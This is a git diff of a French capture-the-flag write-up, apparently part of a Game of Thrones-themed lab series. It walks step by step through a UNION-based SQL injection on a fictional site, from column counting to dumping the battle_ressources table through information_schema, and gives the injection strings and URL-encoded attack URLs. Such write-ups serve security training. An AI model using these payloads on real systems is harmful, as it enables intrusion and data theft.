@@ -1,5 +1,6 @@
 ---
 title: Write-up 3
+next: "/write-ups/wu4"
 prev: "/write-ups/wu2"
 ---
 
@@ -19,7 +20,9 @@ Grâce au passe récupéré, John infiltre Castral-Roc et découvre un livre ver
 
 ## 🚀 Étape 1 : Déterminer le nombre de colonne de la bdd : 
 
-```' ORDER BY 1 --```
+```
+' ORDER BY 1 --
+```
 
 Ne pas oublier d'encoder l'url, ce qui donne .../famillelannister.php?member=%27+ORDER+BY+1+--+
 
@@ -29,7 +32,9 @@ On incrémente le nombre jusqu'a obtenir une erreur, dans notre cas lorsque l'on
 
 ## Étape 2 : Identifier les colonnes visibles
 
-```' UNION SELECT 1,2 --```
+```
+' UNION SELECT 1,2 --
+```
 
 Une fois l'url encodée : 
 http://castral-roc.lannisport.south/famillelannister.php?member=%27+UNION+SELECT+1,2+--+
@@ -40,7 +45,9 @@ Ici si nous la bdd nous retourne 1:2 cela indique que nous pouvons exploiter les
 
 ## Étape 3 : Déterminer le nom des tables de la bdd 
 
-```' UNION SELECT table_name,table_schema FROM information_schema.tables --```
+```
+' UNION SELECT table_name,table_schema FROM information_schema.tables --
+```
 
 Encodé : 
 http://castral-roc.lannisport.south/famillelannister.php?member=%27+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+--+
@@ -55,7 +62,9 @@ On trouve ici :
 
 ## Étape 4 : Déterminer le nom des colonnes de la table battle_ressources 
 
-```' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='battle_ressources' --```
+```
+' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='battle_ressources' --
+```
 
 http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+column_name,data_type+FROM+information_schema.columns+WHERE+table_name='battle_ressources'+--+
 
@@ -73,7 +82,9 @@ On trouve :
 
 ## Étape 5 : 
 
+```
 ' UNION SELECT type, CONCAT(ville,' ' ,emplacement) FROM+battle_ressources -- 
+```
 
 http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+type,+CONCAT(ville,'+',emplacement)+FROM+battle_ressources+--+
 
